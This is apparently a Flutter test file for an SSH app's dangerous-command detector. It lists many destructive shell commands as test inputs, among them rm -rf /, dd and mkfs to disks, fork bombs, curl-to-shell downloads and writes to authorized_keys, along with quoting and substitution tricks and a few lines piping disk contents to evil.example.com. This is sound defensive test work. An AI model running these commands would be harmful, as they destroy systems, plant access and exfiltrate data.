import 'dart:io';

import 'package:flutter/widgets.dart' show Locale, StringCharacters;
import 'package:flutter_test/flutter_test.dart';
import 'package:zestssh/l10n/generated/app_localizations.dart';
import 'package:zestssh/services/dangerous_command_service.dart';
import 'package:zestssh/utils/hidden_characters.dart';

void main() {
  // What runs from the app is checked as a shell reads it, its quotes read past:
  // a filled value is quoted, and the plain check took `rm -rf '/'` for harmless
  // (a review proved it). `check` is what checkFilled builds on.
  test('nothing in the app checks a command with the plain check', () {
    final plain = <String>[];
    for (final file in Directory('lib').listSync(recursive: true).whereType<File>()) {
      if (!file.path.endsWith('.dart') || file.path.contains('generated')) continue;
      if (file.readAsStringSync().contains('DangerousCommandService.check(')) plain.add(file.path);
    }
    expect(plain, isEmpty);
  });

  // A question shown a command with a value masked, and handed what was found in
  // the real one, read the value out in its sentences.
  test('a question shown anything but what runs is told what runs', () {
    final told = <String>[];
    for (final file in Directory('lib').listSync(recursive: true).whereType<File>()) {
      if (!file.path.endsWith('.dart') || file.path.contains('generated')) continue;
      final source = file.readAsStringSync();
      for (final asked in RegExp(r'showDangerousCommandDialog\([^;]*?command: (\w+),([^;]*?)\);').allMatches(source)) {
        if (asked[1] == 'shown' && !asked[2]!.contains('runs: command')) told.add(file.path);
      }
    }
    expect(told, isEmpty);
    expect(
      File('lib/features/snippets/run_snippet.dart').readAsStringSync(),
      contains('runs: command'),
      reason: 'the rule above is looking at the right thing',
    );
  });

  group('a command with values filled in', () {
    test('a value in quotes is read past: what it does is what it does without them', () {
      // The rules read a target in quotes by themselves now, with its place.
      expect(DangerousCommandService.check("rm -rf '/'").map((m) => m.kind), [DangerKind.criticalDelete]);
      expect(DangerousCommandService.checkFilled("rm -rf '/'/*").map((m) => m.kind), [DangerKind.criticalDelete]);
      expect(DangerousCommandService.checkFilled('rm -rf "/home"').map((m) => m.kind), [DangerKind.criticalDelete]);
      // Quotes in the middle of a word are what only reading past them finds.
      expect(DangerousCommandService.check("r'm' -rf /"), isEmpty, reason: 'the rules alone do not');
      final found = DangerousCommandService.checkFilled("r'm' -rf /");
      expect(found.map((m) => m.kind), [DangerKind.criticalDelete]);
      expect((found.single.start, found.single.end), (-1, -1), reason: 'no place in the text as it stands');
      expect(found.single.quotedIn("r'm' -rf /"), 'rm -rf /', reason: 'its sentence still has something to quote');
    });

    test('what the rules find as it stands keeps its place, and is not said twice', () {
      final found = DangerousCommandService.checkFilled("sudo 'reboot'");
      expect(found.map((m) => m.kind), [DangerKind.reboot]);
      expect(found.single.start, greaterThanOrEqualTo(0));
    });

    test('a harmless command stays so, quotes or none', () {
      expect(DangerousCommandService.checkFilled('uptime'), isEmpty);
      expect(DangerousCommandService.checkFilled("rm -rf '/tmp/build'/*"), isEmpty);
      expect(DangerousCommandService.checkFilled("docker restart 'shop'"), isEmpty);
    });
  });

  // Only some kinds became a look: on what they run
  // nothing may have got less. `sh -c 'rm -rf /'` and `dd of=/etc/fstab` were told
  // "Nothing here is known to do harm" (found in review).
  group('nothing that got the red question gets less', () {
    const red = <String>[
      // Deleting what the system needs, however it is written.
      'rm -rf /',
      'rm -rf /*',
      'rm -rf /var/log',
      'sudo rm -rf /',
      'rm -rf *',
      'rm -rf ~',
      r'rm -rf $HOME',
      r'rm -rf ${HOME}',
      'rm -rf .',
      'rm -fr /',
      'rm -Rf /etc',
      'rm -r -f /',
      'rm -f -r /etc',
      'rm --recursive --force /',
      'rm -r --force ~',
      'rm --force -R /var/log',
      'sudo rm -v -r -f /*',
      'rm -i -rf /usr',
      'rm -rf build /*',
      'rm -rf ./build /*',
      'rm build -rf /etc',
      'rm -rf \\\n  /',
      'rm -r \\\r\n  -f /home',
      'rm \\\n  -rf /',
      "rm -rf '/'",
      'rm -rf "/home"',
      r'rm -rf "$HOME"',
      'rm --recursive --force build',
      'rm --force --recursive build',
      'rm -v --recursive -i --force build',
      'rm -r --no-preserve-root build',
      'sudo rm -rf / --no-preserve-root',
      // find, deleting under what rm -rf would be asked about.
      'find / -name x -delete',
      'find / -delete',
      'find /etc -delete',
      'find /tmp / -delete',
      'find -L /usr -type f -delete',
      'find ~ -type f -delete',
      r'find $HOME -name x -delete',
      r'find "$HOME" -delete',
      'find "/" -delete',
      'sudo find / -name x -exec rm -rf {} +',
      'find /var -execdir /bin/rm {} +',
      'find / -name x | xargs rm -f',
      'find / -print0 | sudo xargs -0 rm',
      'find / -name x \\\n  -delete',
      // A disk.
      'mkfs.ext4 /dev/sda1',
      'mkfs.xfs /dev/sdb',
      'mkfs -t ext4 /dev/sda',
      'mke2fs /dev/sdb1',
      'dd if=/dev/zero of=/dev/sda bs=1M',
      'dd if=disk.img of=/dev/sdb',
      'dd if=disk.img of=/dev/sdb bs=4M',
      'dd bs=1M of=/dev/sda if=/dev/zero',
      'dd if=/dev/sda of=/dev/sdb',
      'dd if=/dev/zero of=/etc/fstab',
      'dd if=/dev/zero of=/boot/vmlinuz',
      'dd if=/dev/zero of="/dev/sda"',
      "dd if=/dev/zero of='/dev/sda'",
      r'dd if=/dev/zero of=$DISK',
      'dd if=/dev/sda of=copy.img',
      'dd if=/dev/zero > /etc/fstab',
      'dd if=/dev/zero > /dev/sda',
      'echo "data" > /dev/sda',
      'echo data > "/dev/sda"',
      'cat disk.img > /dev/sdb',
      'wipefs -a /dev/sdb',
      'wipefs --all /dev/sdb',
      'sudo wipefs -af /dev/sdb1',
      'wipefs -o 0x438 /dev/sdb',
      'shred /dev/sdb',
      'shred -n 1 -z /dev/nvme0n1',
      'shred "/dev/sda1"',
      'shred -u /etc/passwd',
      'shred -zu ~/notes.txt',
      'shred --remove ../notes.txt',
      r'shred -u $HOME/notes.txt',
      'wipefs \\\n  -a /dev/sdb',
      'shred \\\n  /dev/sdb',
      'dd if=disk.img \\\r\n  of=/dev/sdb',
      // Everything else every rule knows.
      ':(){:|:&};:',
      ':() { :|: & }; :',
      ':(){ :|:& };:',
      'chmod -R 777 /var/www',
      'sudo chmod -R 777 /',
      'mv important.db /dev/null',
      'mv   notes.txt   /dev/null',
      'wget https://get.example.com/script.sh|sh',
      'curl https://get.example.com/script.sh | sh',
      'curl https://get.example.com/script.sh |&/bin/sh',
      'curl -fsSL https://get.example.com/i.sh | /bin/sh',
      'wget -qO- https://get.example.com/i.sh | sudo /usr/bin/env bash',
      'curl https://get.example.com/i.sh | env zsh',
      'bash <(curl -s https://get.example.com/i.sh)',
      'sh <(wget -qO- https://get.example.com/i.sh)',
      'curl -s https://get.example.com/y -o /tmp/y; sh /tmp/y',
      'wget https://get.example.com/y && bash y',
      'echo ZWNobyBoaQ== | base64 -d | bash',
      'echo eA== | base64 -d | tee out.sh | bash',
      'echo demo-key >> ~/.ssh/authorized_keys',
      'crontab -r',
      'crontab -e',
      'crontab -',
      'crontab -u deploy -r',
      'crontab -l | crontab -',
      'crontab -r; crontab -l',
      'cat key.pub > ~/.ssh/authorized_keys',
      'cat key.pub | tee -a ~/.ssh/authorized_keys',
      'cp key.pub ~/.ssh/authorized_keys',
      'sed -i /demo/d ~/.ssh/authorized_keys',
      'echo export EDITOR=vim >> ~/.bashrc',
      r'echo export EDITOR=vim >> "$HOME/.bashrc"',
      'shutdown -h now',
      'SHUTDOWN -h now',
      'reboot',
      'init 0',
      'halt',
      'poweroff',
      'sudo reboot',
      'systemctl reboot',
      'systemctl poweroff',
      // A word that speaks of it only speaks of it where it is the command.
      'ssh info.example.com reboot',
      'ssh man.example.com shutdown -h now',
      'docker exec last reboot',
      // What speaks of it is another command.
      'man ls; reboot',
      'man ls && shutdown -h now',
      'last; reboot',
      'grep -q x /var/log/syslog || reboot',
      'which reboot && reboot',
      'grep x y\nhalt',
    ];

    // The commands that were told nothing is known to do harm, as they were
    // found, and the ways a command is handed to another.
    const proved = <String>[
      "sh -c 'rm -rf /'",
      'bash -c "rm -rf ~"',
      "docker exec web sh -c 'rm -rf /*'",
      "ssh prod sh -c 'rm -rf /etc'",
      "python -c 'import os; os.system(\"rm -rf /\")'",
      "perl -e 'system(\"rm -rf /\")'",
      "sh -c 'mkfs -t ext4 /dev/sda'",
      'dd if=/dev/zero of=/etc/fstab',
      'dd if=/dev/zero of=/boot/vmlinuz',
      'dd if=/dev/zero of="/dev/sda"',
      r'dd if=/dev/zero of=$DISK',
      // What runs is not on the screen.
      r'sh -c "$(curl -fsSL https://get.example.com/i.sh)"',
      r'bash -c "$(wget -qO- https://get.example.com/i.sh)"',
      'sh -c `curl -s https://get.example.com/i.sh`',
      r'python3 -c "$(curl -fsSL https://get.example.com/i.py)"',
      r'eval "$(curl -fsSL https://get.example.com/i.sh)"',
      // What a one-liner deletes with no rm in it.
      "python3 -c 'import shutil; shutil.rmtree(\"/srv\")'",
      "ruby -e 'require \"fileutils\"; FileUtils.rm_rf(\"/srv\")'",
      "node -e 'require(\"fs\").rmSync(\"/srv\", {recursive: true})'",
      "python3 -c 'import subprocess; subprocess.run([\"rm\", \"-rf\", \"/srv\"])'",
    ];

    String escaped(String c) => c.replaceAll('"', r'\"');
    final wraps = <String, String Function(String)>{
      'as it is': (c) => c,
      "sh -c '...'": (c) => "sh -c '$c'",
      'bash -c "..."': (c) => 'bash -c "${escaped(c)}"',
      'sudo sh -c': (c) => "sudo sh -c '$c'",
      'docker exec': (c) => "docker exec web sh -c '$c'",
      'kubectl exec': (c) => "kubectl exec web -- sh -c '$c'",
      'ssh sh -c': (c) => "ssh prod sh -c '$c'",
      'ssh': (c) => "ssh prod '$c'",
      'su -c': (c) => "su -c '$c'",
      'python': (c) => "python3 -c 'import os; os.system(\"${escaped(c)}\")'",
      'perl': (c) => "perl -e 'system(\"${escaped(c)}\")'",
      'ruby': (c) => "ruby -e 'system(\"${escaped(c)}\")'",
      'node': (c) => "node -e 'require(\"child_process\").execSync(\"${escaped(c)}\")'",
    };

    void isRed(String command, {String? how}) {
      final found = DangerousCommandService.checkFilled(command);
      expect(found, isNotEmpty, reason: '${how ?? 'as it is'}: $command');
      expect(worstDangerLevel(found), DangerLevel.harm, reason: '${how ?? 'as it is'}: $command');
    }

    test('in a shell string or a one-liner, what is written with quotes in the middle of a word is read too', () {
      for (final command in [
        "sh -c 'r\"m\" -rf /'",
        'bash -c "r\'m\' -rf /"',
        "docker exec web sh -c 'mk\"fs\".ext4 /dev/sda'",
        'python3 -c "import os; os.system(\'re\'\'boot\')"',
      ]) {
        isRed(command);
      }
      // What it finds has its words to say, and no place in the text as it stands.
      final found = DangerousCommandService.checkFilled("sh -c 'r\"m\" -rf /'").firstWhere((m) => m.kind == DangerKind.criticalDelete);
      expect(found.start, -1);
      expect(found.quotedIn("sh -c 'r\"m\" -rf /'"), 'rm -rf /');
    });

    test('what it quotes of a command in quotes stops at the command', () {
      const command = "sh -c 'rm -rf /'";
      final found = DangerousCommandService.check(command).firstWhere((m) => m.kind == DangerKind.criticalDelete);
      expect(found.quotedIn(command), 'rm -rf /');
    });

    test('every command of the red set, as it is and handed to another', () {
      for (final command in red) {
        for (final wrap in wraps.entries) {
          isRed(wrap.value(command), how: wrap.key);
        }
      }
    });

    test('the commands it was proved on', () {
      for (final command in proved) {
        isRed(command);
      }
    });

    test('a shell string or a one-liner that is only worth a look stays one, and so does dd that only reads', () {
      for (final command in [
        "sh -c 'ls'",
        'bash -c "echo hello"',
        "docker exec frigate sh -c 'ls /media/frigate'",
        "ssh web-01 sh -c 'uptime'",
        'python3 -c "print(1)"',
        "perl -e 'print 1'",
        'dd if=/dev/sda bs=1M',
        'dd if=/dev/sda bs=1M 2>/dev/null | gzip -c',
        'dd if=/dev/sda > /dev/null',
        'dd if=/dev/sda 2>&1 | tail -n 1',
      ]) {
        for (final found in [DangerousCommandService.check(command), DangerousCommandService.checkFilled(command)]) {
          expect(found, isNotEmpty, reason: command);
          expect(worstDangerLevel(found), DangerLevel.look, reason: command);
        }
      }
    });

    test('what no rule ever found stays unfound: a format word by itself, eval of what is not downloaded', () {
      for (final command in [
        'man mkfs',
        'which mkfs',
        r'eval "$(ssh-agent -s)"',
        'ls /boot',
        'rm -rf /tmp/build',
        "rm -rf '/tmp/build'",
        'cat dd > out',
      ]) {
        expect(DangerousCommandService.check(command), isEmpty, reason: command);
      }
    });

    // Each of these was told it changes something, or asked about at all (a
    // review of what the sentences say). As a whole line, one plain
    // command: the group after this one is the rest.
    test('what only reads, or only speaks of it, is not asked about', () {
      for (final command in [
        'cat ~/.ssh/authorized_keys',
        'sudo cat /root/.ssh/authorized_keys',
        'grep demo-key ~/.ssh/authorized_keys',
        'ls -l ~/.ssh/authorized_keys',
        'wc -l ~/.ssh/authorized_keys',
        'crontab -l',
        'sudo crontab -l',
        'crontab -u deploy -l',
        'crontab -l -u deploy',
        'cat /etc/crontab',
        'grep crontab /var/log/syslog',
        'dd if=disk.img of=/dev/null',
        'dd of=/dev/null if=disk.img',
        'dd if=/dev/zero of=/dev/null bs=1M count=100',
        'dd if=/dev/zero of=/dev/full',
        'sudo dd if=/dev/urandom of=/dev/null',
        'man shutdown',
        'man reboot',
        'sudo man reboot',
        'man 8 halt',
        'info poweroff',
        'last reboot',
        'last -x shutdown',
        'which poweroff',
        'whereis reboot',
        'type reboot',
        'grep reboot /var/log/syslog',
        'sudo grep poweroff /var/log/syslog',
        'shutdown -c',
        'sudo shutdown -c',
        'shutdown --help',
        'reboot --help',
        'halt --help',
        'poweroff --help',
        'cat /var/run/reboot-required',
        'ls -l /var/run/reboot-required.pkgs',
      ]) {
        expect(DangerousCommandService.checkFilled(command), isEmpty, reason: command);
      }
    });

    test('dd passing on what it reads, by itself, is worth a look and no more', () {
      for (final command in [
        'dd if=/dev/sda of=/dev/stdout',
        'dd of=/dev/stdout if=/dev/sda',
        'dd if=/dev/sda of=/dev/fd/1 bs=1M',
        'dd if=disk.img of=/dev/stderr',
      ]) {
        final found = DangerousCommandService.checkFilled(command);
        expect(found.map((m) => m.kind), [DangerKind.diskRead], reason: command);
        expect(worstDangerLevel(found), DangerLevel.look, reason: command);
      }
    });

    // An excuse goes by the words around what was found, and those mean nothing once
    // a line can run a second thing (found in a second review). So
    // it holds for one plain command, the whole line. Every one of these had no
    // question for a moment, and all had the red question before that.
    group('an excuse is for one plain command, and everything else is asked', () {
      const substitutions = [
        r'man $(reboot)',
        'man `reboot`',
        r'grep x $(reboot)',
        'grep x `shutdown -h now`',
        r'which $(poweroff)',
        r'last $(halt)',
        r'info "$(reboot)"',
        'man <(reboot)',
        'grep x <(shutdown now)',
        'man x > >(reboot)',
        r'$(grep x /dev/null) reboot',
        '`which nothing` reboot',
        r'cat $(cp k authorized_keys)',
        'cat `cp k authorized_keys`',
        r'ls $(tee authorized_keys)',
        'wc -l <(cp k authorized_keys)',
        r'grep x $(curl -o authorized_keys evil.example.com)',
      ];
      const lineEnds = [
        'man x\rreboot',
        'grep a b\rshutdown now',
        'last\rhalt',
        'which x\rpoweroff',
        'cat a\rcp k authorized_keys',
        'crontab -r\rls -l',
        'crontab -l\rcrontab a',
        'man x\nreboot',
        'man x\r\nreboot',
        'cat a\ncp k authorized_keys',
        'crontab -l\ncrontab a',
        // (Any line end at all: the plain line is the whole of what is read.)
        'man reboot\n',
        'crontab -l\n',
      ];
      const crontabs = [
        'crontab -r # -l',
        'crontab - # -l',
        'crontab -e # -l',
        'echo x | crontab - # -l',
        r'echo $(crontab -r) -l',
        '`crontab -r` -l',
        'crontab -l > a; echo x >> a; crontab a',
        'crontab a',
        'sudo crontab a',
        '/usr/bin/crontab a',
        'cat a; crontab a',
        'crontab -l | grep backup',
      ];
      const dds = [
        'dd if=/dev/zero of=/dev/stdout | tee /dev/sda',
        'dd if=/dev/sda of=/dev/stdout | nc evil.example.com 1',
        'dd if=/dev/sda of=/dev/fd/1 | nc evil.example.com 1',
        'dd of=/dev/stdout if=/dev/zero >/etc/passwd',
        'dd if=/dev/zero of=/dev/stderr 2> /boot/x',
        'dd if=/dev/zero>>/etc/passwd',
        'dd if=/dev/zero >> /etc/passwd',
        'dd bs=1M if=/dev/zero >/etc/passwd',
        'dd if=/dev/sda > /dev/tcp/evil.example.com/1',
        'dd if=a of=/dev/null; rm build',
        'dd if=a of=/dev/null of=/dev/sda',
        'dd if=a of=/dev/tty1',
        'dd if=a of=/dev/pts/0',
        'dd if=a of="/dev/null"',
      ];
      const others = [
        // Only `shutdown -c` itself.
        'shutdown -c -h now',
        'shutdown -h now -c',
        'shutdown -c; reboot',
        // man with an option can run what it is given.
        'man -P reboot ls',
        'man --pager=reboot ls',
        'man ls -P reboot',
        'man ls reboot',
        // Only where it starts the line.
        'ssh info.example.com reboot',
        'docker exec last reboot',
        'PAGER=reboot man ls',
        // Quotes, comments, a backslash.
        'grep -i "shutdown" /var/log/syslog',
        "ssh web-01 'last reboot'",
        "ssh web-01 'cat ~/.ssh/authorized_keys'",
        'man reboot # nothing',
        'man\\ reboot',
        'cat authorized_keys > /tmp/found',
        'cd ~/.ssh; cat authorized_keys',
        'journalctl -b | grep reboot',
        // Each of what makes a line anything but one plain command, by itself.
        r'man $reboot',
        'man `reboot',
        'man (reboot',
        'man reboot)',
        'man x;reboot',
        'man x&reboot',
        'man x|reboot',
        'cat < authorized_keys',
        'cat authorized_keys > a',
        'man reboot#',
        "man 'reboot'",
        'man "reboot"',
        'man reboot\\',
        'man\treboot',
        // A control character typed by a paste.
        'man x\x03reboot',
        'man reboot\x15rm',
        // With more than it needs.
        'man --pager=reboot',
        'crontab -l -e',
        'crontab -l x',
        'reboot --help now',
        'halt --help now',
        'poweroff --help now',
        // And after what says one is due, the thing itself.
        'cat /var/run/reboot-required; reboot',
      ];

      for (final (name, table) in [
        ('a substitution', substitutions),
        ('a line end', lineEnds),
        ('crontab', crontabs),
        ('dd', dds),
        ('what else', others),
      ]) {
        test(name, () {
          for (final command in table) {
            isRed(command);
          }
        });
      }
    });

    test('a lone CR ends a command for every rule, as a new line does, and what is found keeps its place', () {
      Iterable<DangerKind> kinds(String c) => DangerousCommandService.checkFilled(c).map((m) => m.kind);
      // Two commands, each harmless by itself.
      expect(kinds('rm -rf build\rls /'), isNot(contains(DangerKind.criticalDelete)));
      expect(kinds('dd if=a of=b.img bs=1\rof=/dev/sda'), isNot(contains(DangerKind.diskWrite)));
      expect(kinds('rm --recursive build\rgit push --force'), isNot(contains(DangerKind.forcedDeleteLongFlags)));
      // The second is a command of its own.
      final found = DangerousCommandService.checkFilled('ls\rreboot').single;
      expect((found.kind, found.start, found.end), (DangerKind.reboot, 3, 9));
      expect(found.quotedIn('ls\rreboot'), 'reboot');
      expect(kinds('ls\rcrontab a'), [DangerKind.crontab]);
      expect(DangerousCommandService.checkFilled('rm -rf \\\r/').map((m) => m.kind), contains(DangerKind.criticalDelete),
          reason: 'a backslash carries it on, by a CR too');
    });

    test('the thing itself is the thing itself', () {
      expect(DangerousCommandService.checkFilled('reboot').map((m) => m.kind), [DangerKind.reboot]);
      expect(DangerousCommandService.checkFilled('shutdown -h now').map((m) => m.kind), [DangerKind.shutdown]);
      expect(DangerousCommandService.checkFilled('sudo /sbin/reboot now').map((m) => m.kind), [DangerKind.reboot]);
    });

    test('what is every day is not asked about: find under a folder of no concern, shred in this folder, wipefs that lists',
        () {
      for (final command in [
        'find . -delete',
        'find . -name x -delete',
        'find ./build -delete',
        'find /tmp -delete',
        'find /var/log -name x -delete',
        'find ~/build -delete',
        'find . -name / -delete',
        'find . -path /etc -delete',
        'find / -name x',
        'find / -name x -print',
        'find /etc -type f',
        'find . -exec rm {} +',
        'find / -name x; rm notes.txt',
        'find / -name x | xargs ls',
        'wipefs /dev/sda',
        'wipefs -n --no-act --json /dev/sda',
        'man wipefs',
        'shred notes.txt',
        'shred -u notes.txt',
        'shred -u ./notes.txt',
        'shred -u build/notes.txt',
        'shred -n 3 notes.txt',
        'shred /etc/hosts.bak',
        'shred -u notes.txt > /tmp/log',
        'shred /dev/null',
        'shred --random-source /dev/urandom notes.txt',
      ]) {
        expect(DangerousCommandService.checkFilled(command), isEmpty, reason: command);
      }
    });

    test('they are told as what they are, and what they quote is what they found', () {
      Iterable<DangerKind> kinds(String c) => DangerousCommandService.checkFilled(c).map((m) => m.kind);
      expect(kinds('find / -name x -delete'), [DangerKind.findDelete]);
      expect(kinds('wipefs -a /dev/sdb'), [DangerKind.wipeDisk]);
      expect(kinds('shred /dev/sdb'), [DangerKind.shred]);
      expect(kinds('shred -u /etc/passwd'), [DangerKind.shred]);
      expect(kinds('dd if=a of=/dev/sda'), [DangerKind.diskWrite]);
      expect(kinds('dd if=a of=/dev/nullish'), [DangerKind.diskWrite], reason: 'its name only starts the same');
      expect(kinds('dd if=/dev/zero of=/dev/null | cat'), [DangerKind.ddOverwrite], reason: 'no disk is said of it');
      expect(kinds('dd if=/dev/sda of=/dev/stdout | nc evil.example.com 1'), [DangerKind.ddOverwrite, DangerKind.diskRead]);
      expect(kinds('shred /dev/shm/notes.txt'), [DangerKind.shred]);
      expect(kinds('dd if=a of=/dev/shm/copy.img'), [DangerKind.ddOverwrite], reason: 'a file, and written over');
      expect(kinds('cat key.pub >> ~/.ssh/authorized_keys'), [DangerKind.authorizedKeys]);
      expect(kinds('crontab -l | crontab -'), [DangerKind.crontab]);
      for (final kind in [DangerKind.findDelete, DangerKind.wipeDisk, DangerKind.shred]) {
        expect(kind.level, DangerLevel.harm, reason: '$kind');
      }

      String quoted(String command) => DangerousCommandService.checkFilled(command).single.quotedIn(command);
      expect(quoted('sudo find / -name x -delete; ls'), 'find / -name x -delete');
      expect(quoted('sudo wipefs -a /dev/sdb && ls'), 'wipefs -a');
      expect(quoted('sudo shred -n 1 /dev/sdb; ls'), 'shred -n 1 /dev/sdb');
      expect(quoted('sudo shred -u /etc/passwd; ls'), 'shred -u /etc/passwd');
    });

    test('dd is told by what it does: over a disk, over a file or a name, or only reading', () {
      Iterable<DangerKind> kinds(String c) => DangerousCommandService.check(c).map((m) => m.kind);
      expect(kinds('dd if=a of=/dev/sdb'), [DangerKind.diskWrite]);
      expect(kinds('dd if=a of="/dev/sdb"'), [DangerKind.diskWrite]);
      expect(kinds('dd if=a of=/etc/fstab'), [DangerKind.ddOverwrite]);
      expect(kinds(r'dd if=a of=$DISK'), [DangerKind.ddOverwrite]);
      expect(kinds('dd if=a of=copy.img'), [DangerKind.ddOverwrite]);
      expect(kinds('dd if=/dev/sda bs=1M'), [DangerKind.diskRead]);
      expect(kinds('dd if=a of=copy.img; echo of=/dev/sda'), [DangerKind.ddOverwrite],
          reason: 'the of= of another command is not this one\'s');
      expect(DangerKind.ddOverwrite.level, DangerLevel.harm);
    });

    test('a long paste of quotes and of dd with both its parts is still checked quickly', () {
      for (final paste in [
        'rm -rf " ' * 20000,
        "rm -rf '/x' " * 20000,
        'dd if=x ' * 20000,
        'dd if=x of=' * 20000,
      ]) {
        final clock = Stopwatch()..start();
        DangerousCommandService.checkFilled(paste);
        expect(clock.elapsedMilliseconds, lessThan(1500), reason: paste.substring(0, 11));
      }
    });
  });

  // A value typed with dots is checked, and asked about, and never read out: the
  // question shows what it was given to show, and master's join with the sentences
  // (`found`) would have quoted the value (found joining them).
  group('what a question says of a command with a masked value', () {
    const dots = '••••••';

    test('what the value alone makes risky stays red, and is said by what is shown', () {
      const runs = "rm -rf '/etc/hunter22'";
      const shown = "rm -rf '$dots'";
      expect(DangerousCommandService.checkFilled(shown), isEmpty, reason: 'nothing to see in what is shown');
      final said = DangerousCommandService.asShown(runs, shown, DangerousCommandService.checkFilled(runs));
      expect(said.map((m) => m.kind), [DangerKind.criticalDelete]);
      expect(worstDangerLevel(said), DangerLevel.harm);
      expect(said.single.quotedIn(shown), shown);
      expect(said.single.start, -1, reason: 'no place in what is shown');
    });

    test('what only reading past its quotes finds never quotes the words it found it in', () {
      const runs = "re'boot'";
      const shown = "re'$dots'";
      final found = DangerousCommandService.checkFilled(runs);
      expect(found.single.quotedIn(runs), 'reboot', reason: 'found with the value in it');
      final said = DangerousCommandService.asShown(runs, shown, found);
      expect(said.map((m) => m.kind), [DangerKind.reboot]);
      expect(said.single.quotedIn(shown), shown);
    });

    test('what is there to see in what is shown keeps its place in it', () {
      const runs = "sudo reboot 'it'\\''s a long one'";
      const shown = "sudo reboot '$dots'";
      final said = DangerousCommandService.asShown(runs, shown, DangerousCommandService.checkFilled(runs));
      expect(said.map((m) => m.kind), [DangerKind.reboot]);
      expect((said.single.start, said.single.end), (5, 11));
      expect(said.single.quotedIn(shown), 'reboot');
    });

    test('every kind found stays, whichever way each is found', () {
      const runs = "reboot; rm -rf '/etc/hunter22'";
      const shown = "reboot; rm -rf '$dots'";
      final said = DangerousCommandService.asShown(runs, shown, DangerousCommandService.checkFilled(runs));
      expect(said.map((m) => m.kind).toSet(), {DangerKind.reboot, DangerKind.criticalDelete});
      for (final m in said) {
        expect(m.quotedIn(shown), isNot(contains('hunter')));
        expect(m.quotedIn(shown), isNot(contains('/etc')));
      }
    });

    test('with nothing masked, what was found is what is said', () {
      final found = DangerousCommandService.checkFilled('sudo reboot');
      expect(DangerousCommandService.asShown('sudo reboot', 'sudo reboot', found), same(found));
    });

    test('its hidden characters are for what is shown to show: a value with one in it is dots too', () {
      const runs = "rm -rf '/etc/\u202ex'";
      const shown = "rm -rf '$dots'";
      final said = DangerousCommandService.asShown(runs, shown, DangerousCommandService.checkFilled(runs));
      expect(said.single.quotedIn(shown), shown);
      // In what shows of the command itself, it shows by its number.
      const seen = "sudo\u202e rm -rf '$dots'";
      expect(commandForQuestion(seen), r'sudo\u202e' " rm -rf '$dots'");
    });
  });

  // Every rule, on a megabyte made to be what it is slowest on: the check runs where
  // the person is waiting. `wipefs -aaa...` and `shred -uuu...` took half an hour for
  // this much, `|` over and over and `curl;` as long squared (found in a second
  // review). The budget is for a test on a loaded machine: with the
  // rules compiled as a release build has them, the slowest of these takes half a
  // second alone on a desktop.
  group('a long paste', () {
    const mb = 1 << 20;
    String fill(String unit) => unit * (mb ~/ unit.length);
    final pastes = <String, String Function()>{
      for (final unit in const [
        // rm, and what looks over its words.
        'rm ', 'rm -a ', 'rm x ', 'rm -r ', 'rm -rf " ', "rm -rf '/x' ", 'rm \\\n', 'rm --recursive ', 'rm --force ',
        "rm', ", "rm', '-a',",
        // find.
        'find ', 'find / ', 'find -delete x ', 'find . / -deletes ', 'find / a / a / a / a / -deletes ', 'find / -exec ',
        'find / | xargs ', 'find -a ',
        // A disk.
        'mkfs ', 'wipefs ', 'wipefs x ', 'shred ', 'shred -u ', 'shred x ', 'shred /dev/', 'dd ', 'dd if=x ', 'dd if=x of=',
        'dd if=x >', 'dd if=x >>', 'dd of=/dev/null ', '> ', '>', '>>', ':() ', 'chmod ', 'chmod -r ', 'mv a ',
        // What goes into a shell.
        '|', '| ', '|a', '|sudo ', 'sh ', 'sh -c ', 'python -c ', 'eval ', 'curl;', 'curl ', 'curl ; ', 'wget&',
        'base64 |', 'base64 |||', 'base64 ', 'xxd |',
        // What lasts, and the host off.
        'authorized_keys ', 'cat authorized_keys ', 'crontab ', 'crontab -', 'crontab a;', ';crontab', '/crontab ',
        'reboot ', 'man reboot ', 'shutdown ', 'shutdown -c ', 'init ', 'init 0 ', 'halt ', 'poweroff ',
        '--no-preserve-root ', 'rmtree ', 'chmod -r 777 ', '>> ', '>> .', 'perl -e ', 'bash <', 'rm -rf /etc/x ',
        // Nothing in particular.
        ' ', 'a', "'", '"', '`', '(', '\\', '\n', '\r', '\r\n', 'ls -la /tmp\n', 'sudo ',
      ])
        unit: () => fill(unit),
      // One word and a long run of what it looks at next.
      'rm and spaces': () => 'rm${' ' * mb}',
      'rm and a word': () => 'rm ${'a' * mb}',
      'rm and a flag': () => 'rm -${'a' * mb}',
      'rm and quotes': () => "rm -rf ${"'" * mb}",
      'rm and 400 spaces': () => fill('rm${' ' * 400}'),
      'find and spaces': () => 'find${' ' * mb}',
      'wipefs and a flag': () => 'wipefs -${'a' * mb}',
      'wipefs and another': () => 'wipefs -${'o' * mb}',
      'shred and a flag': () => 'shred -${'u' * mb}',
      'shred, a name and a flag': () => 'shred x -${'u' * mb}',
      'a fork and spaces': () => ':()${' ' * mb}',
      'mv and spaces': () => 'mv${' ' * mb}',
      'mv and 400 spaces': () => fill('mv${' ' * 400}'),
      'a pipe and spaces': () => '|${' ' * mb}',
      'a pipe and a word': () => '|${'a' * mb}',
      'curl and a word': () => 'curl;${'a' * mb}',
      'base64 and a word': () => 'base64 |${'a' * mb}',
      '> and spaces': () => fill('>${' ' * 100}'),
    };

    setUpAll(() => DangerousCommandService.checkFilled('the rules, compiled'));

    for (final paste in pastes.entries) {
      test('of ${paste.key.replaceAll('\n', 'a new line').replaceAll('\r', 'a CR')} is checked within its budget', () {
        final text = paste.value();
        final clock = Stopwatch()..start();
        final found = DangerousCommandService.checkFilled(text);
        expect(clock.elapsedMilliseconds, lessThan(5000));
        expect(found.map((m) => m.kind), contains(DangerKind.tooLong), reason: 'it is longer than is read');
      });
    }

    // A run of letters goes back over itself only where what follows it is not the
    // end of a word: `wipefs -aaa...1` is what took half an hour, and what follows has
    // to be in what is read.
    final justRead = DangerousCommandService.kMaxRead - 32;
    for (final (name, text) in [
      ('wipefs', 'wipefs -${'a' * justRead}1'),
      ('wipefs, with a name', 'wipefs x -${'o' * justRead}1'),
      ('shred', 'shred -${'u' * justRead}1'),
      ('shred, with a name', 'shred x -${'u' * justRead}1'),
      ('rm', 'rm -${'a' * justRead}1'),
      ('a one-liner\'s rm', "rm', '-${'a' * justRead}1"),
      ('a pipe', '|${'a' * justRead}1'),
      ('curl', 'curl;${'a' * justRead}1'),
      ('base64', 'base64 |${'a' * justRead}1'),
      ('find', 'find / -exec ${'a' * justRead}1'),
      ('xargs', 'find / | xargs x ${'a' * justRead}1'),
      ('crontab', '\n${'a' * justRead}1'),
    ]) {
